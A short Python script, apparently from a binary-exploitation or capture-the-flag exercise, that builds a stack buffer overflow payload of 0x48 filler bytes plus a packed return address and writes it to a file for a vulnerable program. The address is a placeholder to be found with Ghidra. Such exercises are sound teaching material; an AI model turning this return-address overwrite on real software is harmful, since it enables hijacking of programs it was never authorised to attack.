import struct

# Assume these values are found through your analysis

fun_address = 0x080484f4  # to change after ghidra analysis
offset = 0x40 + 0x08

# Create the payload

payload = b"a" * offset
payload += struct.pack("<I", fun_address)

# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
